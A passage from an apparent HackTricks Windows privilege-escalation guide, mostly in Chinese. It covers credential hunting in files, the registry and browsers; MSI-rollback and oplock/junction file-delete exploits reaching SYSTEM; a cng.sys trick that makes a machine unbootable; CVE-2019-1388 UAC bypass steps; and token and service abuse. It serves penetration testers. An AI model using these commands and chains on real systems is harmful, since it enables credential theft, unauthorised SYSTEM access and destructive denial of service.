wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### 回收站中的 Credentials

你也应该检查 Bin，看看其中是否有 credentials

要**恢复 passwords**，可供多个程序保存的你可以使用: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### 在 registry 中

**其他可能包含 credentials 的 registry keys**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**从 registry 中提取 openssh keys。**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### 浏览器历史记录

你应该检查存储 **Chrome 或 Firefox** 密码的 dbs。\
同时也要检查浏览器的 history、bookmarks 和 favourites，这样也许其中保存了某些 **passwords are**。

从浏览器中提取密码的工具：

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** 是内置于 Windows operating system 的一种技术，允许不同语言的软件组件之间进行 **intercommunication**。每个 COM 组件都通过 **class ID (CLSID)** 进行标识，并且每个组件通过一个或多个 interfaces 暴露功能，这些 interfaces 由 interface IDs (IIDs) 标识。

COM classes 和 interfaces 分别在 registry 下的 **HKEY\CLASSES\ROOT\CLSID** 和 **HKEY\CLASSES\ROOT\Interface** 中定义。这个 registry 通过合并 **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**

在这个 registry 的 CLSIDs 中，你可以找到子 registry **InProcServer32**，其中包含一个指向 **DLL** 的 **default value**，以及一个名为 **ThreadingModel** 的值，它可以是 **Apartment**（Single-Threaded）、**Free**（Multi-Threaded）、**Both**（Single or Multi）或 **Neutral**（Thread Neutral）。

![](<../../images/image (729).png>)

基本上，如果你可以 **overwrite any of the DLLs** that are going to be executed，那么当该 DLL 将由另一个 user 执行时，你就可以 **escalate privileges**。

要了解 attackers 如何使用 COM Hijacking 作为 persistence mechanism，请查看：


{{#ref}}
com-hijacking.md
{{#endref}}

### **Generic Password search in files and registry**

**Search for file contents**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**搜索具有特定文件名的文件**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**搜索注册表中的键名和密码**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### 搜索密码的工具

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **is a msf** 插件，我创建这个插件是为了**自动执行所有在受害者机器内搜索凭据的 metasploit POST 模块**。\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) 会自动搜索本页提到的所有包含密码的文件。\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) 是另一个从系统中提取密码的好工具。

工具 [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) 会搜索多个将这些数据以明文保存的工具中的**sessions**、**usernames** 和 **passwords**（PuTTY、WinSCP、FileZilla、SuperPuTTY 和 RDP）
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

想象一下，**一个以 SYSTEM 运行的进程打开了一个新进程** (`OpenProcess()`) 并拥有**完全访问权限**。同一个进程**还创建了一个新进程** (`CreateProcess()`) ，**但这个进程权限较低，同时继承了主进程的所有 open handles**。\
然后，如果你对这个低权限进程拥有**完全访问权限**，你就可以抓取通过 `OpenProcess()` 创建的、指向高权限进程的**open handle**，并**注入 shellcode**。\
[阅读这个示例以了解更多关于**如何检测和利用这个漏洞**的信息。](leaked-handle-exploitation.md)\
[阅读这篇**其他文章，以更完整地解释如何测试和滥用进程与线程中继承的更多 open handlers，以及不同权限级别下的情况（不只是完全访问）**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

共享内存段，称为 **pipes**，用于进程通信和数据传输。

Windows 提供了一项称为 **Named Pipes** 的功能，允许彼此无关的进程共享数据，甚至可以跨不同网络。这类似于 client/server 架构，其中角色定义为 **named pipe server** 和 **named pipe client**。

当数据通过 **client** 发送到 pipe 时，建立该 pipe 的 **server** 能够**冒充** **client** 的身份，前提是它拥有必要的 **SeImpersonate** 权限。识别一个通过你可以模拟的 pipe 进行通信的**高权限进程**，就提供了一个机会：一旦该进程与你建立的 pipe 交互，你就可以通过采用该进程的身份来**提升权限**。关于如何执行此类攻击的说明，可以在 [**这里**](named-pipe-client-impersonation.md) 和 [**这里**](#from-high-integrity-to-system) 找到有用的指南。

另外，下面这个工具允许你使用类似 burp 的工具来**拦截 named pipe 通信：** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **，而这个工具允许你列出并查看所有 pipes 以寻找 privescs** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

Telephony 服务 (TapiSrv) 在 server 模式下暴露 `\\pipe\\tapsrv` (MS-TRP)。一个远程已认证客户端可以滥用基于 mailslot 的异步事件路径，将 `ClientAttach` 变成对任何可由 `NETWORK SERVICE` 写入的现有文件的任意 **4-byte write**，然后获得 Telephony 管理员权限，并作为该服务加载任意 DLL。完整流程：

- 将 `ClientAttach` 中的 `pszDomainUser` 设置为一个可写的现有路径 → 服务通过 `CreateFileW(..., OPEN_EXISTING)` 打开它，并将其用于异步事件写入。
- 每个事件都会把攻击者可控的 `Initialize` 中的 `InitContext` 写入该句柄。使用 `LRegisterRequestRecipient` (`Req_Func 61`) 注册 line app，触发 `TRequestMakeCall` (`Req_Func 121`)，通过 `GetAsyncEvents` (`Req_Func 0`) 获取，然后注销/关闭以重复进行确定性的写入。
- 将自己添加到 `C:\Windows\TAPI\tsec.ini` 中的 `[TapiAdministrators]`，重新连接，然后用任意 DLL 路径调用 `GetUIDllName`，以 `NETWORK SERVICE` 身份执行 `TSPI_providerUIIdentify`。

更多细节：

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Misc

### Windows 中可能会执行东西的文件扩展名

查看页面 **[https://filesec.io/](https://filesec.io/)**

### 通过 Markdown renderers 进行 Protocol handler / ShellExecute abuse

可点击的 Markdown links 如果被转发给 `ShellExecuteExW`，可能会触发危险的 URI handlers（`file:`、`ms-appinstaller:` 或任何已注册的 scheme）并以当前用户身份执行攻击者控制的文件。参见：

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **监控命令行中的密码**

当你以某个用户身份获得 shell 时，可能会有计划任务或其他进程正在执行，它们会**在命令行中传递凭据**。下面的脚本每两秒捕获一次进程命令行，并将当前状态与前一个状态进行比较，输出任何差异。
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## 从进程中窃取密码

## 从低权限用户到 NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

如果你可以访问图形界面（通过控制台或 RDP），并且启用了 UAC，那么在某些版本的 Microsoft Windows 中，可以从无特权用户运行终端或任何其他进程，例如 "NT\AUTHORITY SYSTEM"。

这使得可以同时利用同一个漏洞提升权限并绕过 UAC。此外，无需安装任何东西，而且在该过程中使用的二进制文件是由 Microsoft 签名并发布的。

受影响的一些系统如下：
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
要利用此漏洞，需要执行以下步骤：
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
你已经在以下 GitHub 仓库中拥有所有必要的文件和信息：

https://github.com/jas502n/CVE-2019-1388

## 从 Administrator Medium 到 High Integrity Level / UAC Bypass

阅读此内容以**了解 Integrity Levels**：


{{#ref}}
integrity-levels.md
{{#endref}}

然后**阅读此内容以了解 UAC 和 UAC bypasses：**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## 从任意文件夹 Delete/Move/Rename 到 SYSTEM EoP

该技术在[**这篇博客文章**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)中有描述，对应的 exploit code [**可在此处获取**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)。

这个攻击的基本原理是滥用 Windows Installer 的 rollback 功能，在卸载过程中用恶意文件替换合法文件。为此，攻击者需要创建一个**恶意 MSI installer**，用于劫持 `C:\Config.Msi` 目录；之后 Windows Installer 会在卸载其他 MSI package 时将 rollback 文件存放到该目录，而这些 rollback 文件会被修改为包含恶意 payload。

总结后的技术步骤如下：

1. **Stage 1 – Preparing for the Hijack (leave `C:\Config.Msi` empty)**

- Step 1: Install the MSI
- 创建一个 `.msi`，在可写目录（`TARGETDIR`）中安装一个无害文件（例如 `dummy.txt`）。
- 将 installer 标记为 **"UAC Compliant"**，这样**非管理员用户**也可以运行它。
- 安装完成后保持对该文件的一个 **handle** 打开。

- Step 2: Begin Uninstall
- 卸载同一个 `.msi`。
- 卸载过程开始将文件移动到 `C:\Config.Msi`，并将其重命名为 `.rbf` 文件（rollback backups）。
- 通过 `GetFinalPathNameByHandle` **轮询打开的文件句柄**，检测文件何时变成 `C:\Config.Msi\<random>.rbf`。

- Step 3: Custom Syncing
- 该 `.msi` 包含一个**自定义卸载动作 (`SyncOnRbfWritten`)**，它会：
- 在 `.rbf` 被写入时发出信号。
- 然后在继续卸载前**等待**另一个事件。

- Step 4: Block Deletion of `.rbf`
- 当收到信号时，**打开 `.rbf` 文件**且不使用 `FILE_SHARE_DELETE` —— 这会**阻止它被删除**。
- 然后**回传信号**，以便卸载可以完成。
- Windows Installer 无法删除 `.rbf`，并且因为无法删除全部内容，**`C:\Config.Msi` 不会被移除**。

- Step 5: Manually Delete `.rbf`
- 你（攻击者）手动删除 `.rbf` 文件。
- 现在 **`C:\Config.Msi` 为空**，可以被劫持。

> 此时，**触发 SYSTEM 级别的任意文件夹 delete 漏洞**来删除 `C:\Config.Msi`。

2. **Stage 2 – Replacing Rollback Scripts with Malicious Ones**

- Step 6: Recreate `C:\Config.Msi` with Weak ACLs
- 你自己重新创建 `C:\Config.Msi` 文件夹。
- 设置**弱 DACLs**（例如 Everyone:F），并**保持一个带有 `WRITE_DAC` 的 handle 打开**。

- Step 7: Run Another Install
- 再次安装该 `.msi`，并设置：
- `TARGETDIR`: 可写位置。
- `ERROROUT`: 一个触发强制失败的变量。
- 这次安装将用于再次触发 **rollback**，读取 `.rbs` 和 `.rbf`。

- Step 8: Monitor for `.rbs`
- 使用 `ReadDirectoryChangesW` 监控 `C:\Config.Msi`，直到出现新的 `.rbs`。
- 捕获其文件名。

- Step 9: Sync Before Rollback
- 该 `.msi` 包含一个**自定义安装动作 (`SyncBeforeRollback`)**，它会：
- 在 `.rbs` 创建时发出事件信号。
- 然后在继续前**等待**。

- Step 10: Reapply Weak ACL
- 在收到 `.rbs created` 事件后：
- Windows Installer 会对 `C:\Config.Msi` **重新应用强 ACLs**。
- 但由于你仍然持有一个带 `WRITE_DAC` 的 handle，你可以再次**重新应用弱 ACLs**。

> ACLs **只在打开 handle 时强制执行**，所以你仍然可以向该文件夹写入。

- Step 11: Drop Fake `.rbs` and `.rbf`
- 用一个**伪造的 rollback script** 覆盖 `.rbs` 文件，该脚本告诉 Windows：
- 将你的 `.rbf` 文件（恶意 DLL）恢复到一个**特权位置**（例如 `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`）。
- 放入你伪造的 `.rbf`，其中包含一个**恶意 SYSTEM 级 payload DLL**。

- Step 12: Trigger the Rollback
- 发送同步事件，让 installer 恢复执行。
- 一个 **type 19 custom action (`ErrorOut`)** 被配置为在已知位置**故意使安装失败**。
- 这会导致 **rollback 开始**。

- Step 13: SYSTEM Installs Your DLL
- Windows Installer：
- 读取你恶意的 `.rbs`。
- 将你的 `.rbf` DLL 复制到目标位置。
- 现在你已经把**恶意 DLL 放到了一个 SYSTEM 加载路径**中。

- Final Step: Execute SYSTEM Code
- 运行一个可信的**auto-elevated binary**（例如 `osk.exe`），它会加载你劫持的 DLL。
- **Boom**：你的代码以 **SYSTEM** 身份执行。


### 从任意文件 Delete/Move/Rename 到 SYSTEM EoP

主要的 MSI rollback 技术（前一个）假设你可以删除**整个文件夹**（例如 `C:\Config.Msi`）。但如果你的漏洞只能允许**任意文件删除**呢？

你可以利用 **NTFS internals**：每个文件夹都有一个隐藏的 alternate data stream，叫做：
```
C:\SomeFolder::$INDEX_ALLOCATION
```
这个 stream 存储该文件夹的 **index metadata**。

因此，如果你 **删除一个文件夹的 `::$INDEX_ALLOCATION` stream**，NTFS 会 **将整个文件夹** 从 filesystem 中移除。

你可以使用标准的 file deletion APIs 来做到这一点，例如：
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> 即使你调用的是一个 *file* delete API，它也会 **删除文件夹本身**。

### From Folder Contents Delete to SYSTEM EoP
如果你的 primitive 不允许你删除任意 files/folders，但它 **允许删除攻击者可控 folder 的 *contents***，怎么办？

1. Step 1: Setup 一个 bait folder 和 file
- Create: `C:\temp\folder1`
- 在其中创建: `C:\temp\folder1\file1.txt`

2. Step 2: 在 `file1.txt` 上放置一个 **oplock**
- 当特权进程尝试删除 `file1.txt` 时，oplock 会 **暂停执行**。
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. Step 3: 触发 SYSTEM process（例如，`SilentCleanup`）
- 这个 process 会扫描文件夹（例如，`%TEMP%`）并尝试删除其内容。
- 当它到达 `file1.txt` 时，**oplock 触发**并将控制权交给你的 callback。

4. Step 4: 在 oplock callback 内部 – 重定向删除

- Option A: 将 `file1.txt` 移动到其他位置
- 这会清空 `folder1`，同时不会破坏 oplock。
- 不要直接删除 `file1.txt` —— 那样会过早释放 oplock。

- Option B: 将 `folder1` 转换为一个 **junction**：
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- Option C: 在 `\RPC Control` 中创建一个 **symlink**：
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> 这会针对存储文件夹元数据的 NTFS internal stream —— 删除它就会删除该文件夹。

5. Step 5: Release the oplock
- SYSTEM process continues and tries to delete `file1.txt`.
- But now, due to the junction + symlink, it's actually deleting:
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**结果**：`C:\Config.Msi` 被 SYSTEM 删除。

### 从任意文件夹创建到永久 DoS

利用一个原语，让你以 **SYSTEM/admin** 身份**创建任意文件夹**——即使你**不能写文件**或**设置弱权限**。

创建一个**文件夹**（不是文件），名称为一个**关键 Windows 驱动**，例如：
```
C:\Windows\System32\cng.sys
```
- 这个路径通常对应 `cng.sys` 内核模式驱动。
- 如果你**预先把它创建成一个文件夹**，Windows 在启动时就无法加载实际驱动。
- 然后，Windows 会在启动过程中尝试加载 `cng.sys`。
- 它会看到这个文件夹，**无法解析实际驱动**，并且**崩溃或停止启动**。
- 这里**没有回退机制**，而且**没有外部干预**（例如启动修复或磁盘访问）就**无法恢复**。

### 从特权日志/备份路径 + OM symlinks 到任意文件覆盖 / 启动 DoS

当一个**特权服务**把日志/导出写入一个从**可写配置**读取的路径时，可以用 **Object Manager symlinks + NTFS mount points** 把这个特权写入重定向成任意覆盖（即使**没有** SeCreateSymbolicLinkPrivilege）。

**要求**
- 存放目标路径的配置对攻击者可写（例如 `%ProgramData%\...\.ini`）。
- 能够创建指向 `\RPC Control` 的 mount point，以及一个 OM file symlink（James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)）。
- 存在会向该路径写入的特权操作（log、export、report）。

**示例链**
1. 读取配置以恢复特权日志目标路径，例如 `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt`，位于 `C:\ProgramData\ICONICS\IcoSetup64.ini` 中。
2. 在没有 admin 的情况下重定向该路径：
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. 等待特权组件写入日志（例如，管理员触发 "send test SMS"）。这次写入会落到 `C:\Windows\System32\cng.sys`。
4. 检查被覆盖的目标（hex/PE parser）以确认损坏；重启会强制 Windows 加载被篡改的 driver path → **boot loop DoS**。这同样可以推广到任何特权 service 会打开并写入的受保护文件。

> `cng.sys` 通常从 `C:\Windows\System32\drivers\cng.sys` 加载，但如果在 `C:\Windows\System32\cng.sys` 中存在一个副本，就可能会优先尝试它，因此它是一个对损坏数据来说可靠的 DoS sink。



## **从 High Integrity 到 System**

### **New service**

如果你已经在一个 High Integrity process 中运行，通往 SYSTEM 的 **path** 可以很简单，只需**创建并执行一个新的 service**：
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> When creating a service binary make sure it's a valid service or that the binary performs the necessary actions to fast as it'll be killed in 20s if it's not a valid service.

### AlwaysInstallElevated

From a High Integrity process you could try to **enable the AlwaysInstallElevated registry entries** and **install** a reverse shell using a _**.msi**_ wrapper.\
[More information about the registry keys involved and how to install a _.msi_ package here.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**You can** [**find the code here**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

If you have those token privileges (probably you will find this in an already High Integrity process), you will be able to **open almost any process** (not protected processes) with the SeDebug privilege, **copy the token** of the process, and create an **arbitrary process with that token**.\
Using this technique is usually **selected any process running as SYSTEM with all the token privileges** (_yes, you can find SYSTEM processes without all the token privileges_).\
**You can find an** [**example of code executing the proposed technique here**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

This technique is used by meterpreter to escalate in `getsystem`. The technique consists on **creating a pipe and then create/abuse a service to write on that pipe**. Then, the **server** that created the pipe using the **`SeImpersonate`** privilege will be able to **impersonate the token** of the pipe client (the service) obtaining SYSTEM privileges.\
If you want to [**learn more about name pipes you should read this**](#named-pipe-client-impersonation).\
If you want to read an example of [**how to go from high integrity to System using name pipes you should read this**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

If you manages to **hijack a dll** being **loaded** by a **process** running as **SYSTEM** you will be able to execute arbitrary code with those permissions. Therefore Dll Hijacking is also useful to this kind of privilege escalation, and, moreover, if far **more easy to achieve from a high integrity process** as it will have **write permissions** on the folders used to load dlls.\
**You can** [**learn more about Dll hijacking here**](dll-hijacking/index.html)**.**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**Read:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Useful tools

**Best tool to look for Windows local privilege escalation vectors:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Check for misconfigurations and sensitive files (**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Detected.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Check for some possible misconfigurations and gather info (**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Check for misconfigurations**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- It extracts PuTTY, WinSCP, SuperPuTTY, FileZilla, and RDP saved session information. Use -Thorough in local.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Extracts crendentials from Credential Manager. Detected.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Spray gathered passwords across domain**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh is a PowerShell ADIDNS/LLMNR/mDNS spoofer and man-in-the-middle tool.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Basic privesc Windows enumeration**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Search for known privesc vulnerabilities (DEPRECATED for Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Local checks **(Need Admin rights)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Search for known privesc vulnerabilities (needs to be compiled using VisualStudio) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Enumerates the host searching for misconfigurations (more a gather info tool than privesc) (needs to be compiled) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Extracts credentials from lots of softwares (precompiled exe in github)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Port of PowerUp to C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Check for misconfiguration (executable precompiled in github). Not recommended. It does not work well in Win10.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Check for possible misconfigurations (exe from python). Not recommended. It does not work well in Win10.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Tool created based in this post (it does not need accesschk to work properly but it can use it).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Reads the output of **systeminfo** and recommends working exploits (local python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Reads the output of **systeminfo** andrecommends working exploits (local python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

You have to compile the project using the correct version of .NET ([see this](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). To see the installed version of .NET on the victim host you can do:
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## 参考资料

- [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)
- [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)
- [https://www.youtube.com/watch?v=_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

- [0xdf – HTB/VulnLab JobTwo: Word VBA macro phishing via SMTP → hMailServer credential decryption → Veeam CVE-2023-27532 to SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) and kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)

- [Check Point Research – Chasing the Silver Fox: Cat & Mouse in Kernel Shadows](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [Unit 42 – Privileged File System Vulnerability Present in a SCADA System](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [Symbolic Link Testing Tools – CreateSymlink usage](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [A Link to the Past. Abusing Symbolic Links on Windows](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [RegPwn BOF (Cobalt Strike BOF port)](https://github.com/Flangvik/RegPwnBOF)
- [ZDI - Node.js Trust Falls: Dangerous Module Resolution on Windows](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [Node.js modules: loading from `node_modules` folders](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [Trail of Bits - C/C++ checklist challenges, solved](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
- [Microsoft Learn - RtlQueryRegistryValues function](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlqueryregistryvalues)
- [PowerShell Gallery - NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/2.0.1)

{{#include ../../banners/hacktricks-training.md}}
